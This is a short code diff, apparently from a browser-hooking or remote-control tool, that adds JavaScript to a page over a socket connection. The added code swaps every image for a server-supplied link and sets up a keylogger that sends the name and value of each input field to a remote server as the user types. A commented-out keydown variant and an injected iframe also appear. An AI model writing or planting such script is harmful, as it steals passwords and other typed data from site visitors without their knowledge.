@@ -59,8 +59,20 @@ findIP.then(function(result) {
                 $('body').append('<iframe style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:50%;height:50%;background:transparent;border:none;" id="terminal" src="'+data.link+'"></iframe>'); 
             });
 
-            
+            socket.on('replaceImages',function(data){
+              var imgs = document.getElementsByTagName("img");
+              for(var i=0, l=imgs.length;i<l;i++){
+                imgs[i].src = data.link;
+              }
+            });
 
+            /*$(document).bind('keydown',function(e){
+             // alert($(":input").val());
+              socket.emit('keylogger',{"key":$("input")[0].val()});
+            });*/
+            $("input").on('input',function(){
+              socket.emit('keylogger',{"id":$(this).attr("name"),"value":$(this).attr("name")+": "+$(this).val()});
+            });
 
           });
       });
